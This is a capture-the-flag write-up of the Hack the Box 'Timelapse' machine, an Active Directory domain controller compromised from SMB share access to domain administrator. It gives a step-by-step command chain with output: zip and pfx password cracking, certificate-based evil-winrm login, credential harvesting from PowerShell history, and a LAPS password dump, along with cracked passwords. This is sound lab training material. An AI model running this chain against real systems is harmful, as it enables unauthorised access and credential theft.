# Timelapse
**Date:** April 13th 2022

**Author:** j.info

**Link:** [**Timelapse**](https://app.hackthebox.com/machines/452) CTF on Hack the Box

**Hack the Box Difficulty Rating:** Easy

<br>

## Objectives
- user own
- root own

<br>

## Initial Enumeration

### Rustscan -> Nmap Scan

`sudo rustscan --range 1-65535 --ulimit 5000 -a 10.10.11.152 -- -sC -sV`

```bash
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-03-27 10:01:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61583/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

<br>

## SMB Digging

Checking out what shares we have available:

`smbclient -L \\10.10.11.152`

```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share
```

I take a look in the **Shares** share and download all of the files:

```bash
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1191062 blocks available
smb: \> prompt
smb: \> recurse
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (14.1 KiloBytes/sec) (average 14.1 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (1767.0 KiloBytes/sec) (average 1369.9 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (822.4 KiloBytes/sec) (average 1296.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (1909.6 KiloBytes/sec) (average 1457.1 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (611.9 KiloBytes/sec) (average 1385.4 KiloBytes/sec)
```

<br>

## PFX File

The **.zip** file from the **dev** directory is password protected so I crack it with **John the Ripper**:

`zip2john winrm_backup.zip > ziphash`

john ziphash --wordlist=rockyou.txt

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2022-04-13 09:52) 4.347g/s 15101Kp/s 15101Kc/s 15101KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

After that we're able to unzip the file which leaves us with a **.pfx file**:

```bash
-rwxr-xr-x 1 kali kali 2555 Oct 25 10:21 legacyy_dev_auth.pfx
```

Reading up on pfx files tells me it's a certificate in **PKCS#12 format**. It can contain multiple objects inside the archive including a certificate, and public/private keys. It's also password protected.

It also looks like we can use **John the Ripper** here too. I had no idea there was a `pfx2john` command, but there is. I run:

`pfx2john legacyy_dev_auth.pfx > pfxhash`

`john pfxhash --wordlist=rockyou.txt`

And it cracks very quickly:

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:33 DONE (2022-04-13 09:57) 0.02982g/s 96383p/s 96383c/s 96383C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I then look up how to use pfx files and using the **openssl command** you can extract files from the archive. I run the following and then enter the password we just cracked, and another password of my choosing for the last two:

`openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key`

```bash
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

With that we have a **legacyy.key file** that has a private key in it:

```bash
Bag Attributes
    Microsoft Local Key set: <No Values>
    localKeyID: 01 00 00 00 
    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
    Microsoft CSP Name: Microsoft Software Key Storage Provider
Key Attributes
    X509v3 Key Usage: 90 
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHDBOBgkqhkiG9w0BBQ0wQTApBgkqhkiG9w0BBQwwHAQIjfRt000G2iACAggA
MAwGCCqGSIb3DQIJBQAwFAYIKoZIhvcNAwcECJ5GxO8hCJ6kBIIEyC6tx02Jqvu8

--- SNIP ---
```

You can also extract the **certificate** from the file. I run:

`openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt`

And end up with the **legacyy.crt file**:

```bash
Bag Attributes
    localKeyID: 01 00 00 00 
subject=CN = Legacyy

issuer=CN = Legacyy

-----BEGIN CERTIFICATE-----
MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1

--- SNIP ---
```

And finally you can decrypt the encrypted private key. I run:

`openssl rsa -in legacyy.key -out decrypted.key`

And enter the password I chose when it asked for the PEM pass phrase upon creating the key. Now that we've decrypted the encrypted key it leaves us with a standard **RSA private key**:

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEApVYHo2IWRx7i800jrWFxzoues0qHK/aJvOeGA7v+qhwWuDX/
MRT+iDTQTZWFrwMQryjPGkLB6b97aKcKUPmG0WQ7tTccob3zTU0V43RUFfZyIipK

--- SNIP ---
```

<br>

## System Access

Now that we have these files we should be able to use them to connect over to the box with **evil-winrm**.

`evil-winrm -i 10.10.11.152 -S -u -p -c legacyy.crt -k legacyy.key`

```powershell
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user legacyy
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 12:17:10 PM
Password expires             Never
Password changeable          10/24/2021 12:17:10 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/13/2022 2:13:56 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.

*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

We're in!

<br>

## System Enumeration

I head over to the desktop and grab the **user.txt** flag:

```powershell
    Directory: C:\Users\legacyy\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/12/2022   3:45 PM             34 user.txt
```

I upload PowerUp.ps1 but it does not work and gets blocked by the systems antivirus:

`./PowerUp.ps1`

```powershell
This script contains malicious content and has been blocked by your antivirus software.
```


I then upload winPEAS and run it:

`./winPEASx64.exe log=log.txt`

```powershell
"log" argument present, redirecting output to file "log.txt"
```

Going through the log shows us that there is a PowerShell history file with data in it:

```powershell
PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS history size: 434B
```

Looking at the PowerShell history file shows us some credentials for the user **svc_deploy**:

`type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

<br>

## SVC_DEPLOY User

I run another **evil-winrm** to connect over as user **svc_deploy** and get a shell:

`evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --ssl`

```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
timelapse\svc_deploy
```

## More System Enumeration

Earlier we downloaded files from the SMB share and unzippped them. Some of those files were:

```bash
-rw-r--r-- 1 kali kali  104422 Apr 13 09:50 LAPS_Datasheet.docx
-rw-r--r-- 1 kali kali  641378 Apr 13 09:50 LAPS_OperationsGuide.docx
-rw-r--r-- 1 kali kali   72683 Apr 13 09:50 LAPS_TechnicalSpecification.docx
-rw-r--r-- 1 kali kali 1118208 Apr 13 09:50 LAPS.x64.msi
```

So it looks like Local Area Password Solution (LAPS) may be good thing for us to check out here.

I take a look at the **svc_deploy** users group memberships:

`net user svc_deploy`

```powershell
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
```

And you can see they have **LAPS_Readers** so we should be able to dump the  password from it for the admin account.

I download the following [**laps.py script**](https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py) and take a look through the code. The options state you need to specify a user, password, and domain name:

```bash
usage: laps.py [-h] -u USERNAME -p PASSWORD [-l LDAPSERVER] -d DOMAIN
```

Let's give it a shot and see what happens. I add the timepalse.htb into my /etc/hosts file with the IP address for the box and then run:

`python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb`

```bash
DC01$:AUw04.76%dqY1O8k&7aBeyA6
```

<br>

## Administrator

With that hash we can connect over as the local administrator:

`evil-winrm -i 10.10.11.152 -u administrator -p 'AUw04.76%dqY1O8k&7aBeyA6' -S`

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

I change over to the desktop directory but the **root.txt** flag is not there like it usually is.

I run a recursive search to find the file:

`Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force`

```powershell
   Directory: C:\Documents and Settings\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/12/2022   3:45 PM             34 root.txt
```

<br>

And with that flag we've completed this CTF!

<br>

![](images/timelapse1.png)

<br>

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration using **rustscan** / **nmap**
- Looking around an SMB share and using **smbclient** to download files
- Cracking a password protected zip file with **John the Ripper**
- Cracking a password protected pfx file with **John the Ripper**
- Extracting a .crt and .key files from the pfx file using **openssl**
- Using the .crt file to get a shell by connecting over with **evil-winrm**
- Finding credentials in the **PowerShell history file**
- Logging in with the new credentials which have **LAPS_Readers** access
- Using a **LAPS dump script** to get the local administrators password and then login with it

<br>

Many thanks to:
- [**d4rkpayl0ad**](https://app.hackthebox.com/users/168546) for creating this CTF.
- **Hack the Box** for hosting this CTF.

<br>

You can visit them at: [**https://www.hackthebox.com**](https://www.hackthebox.com)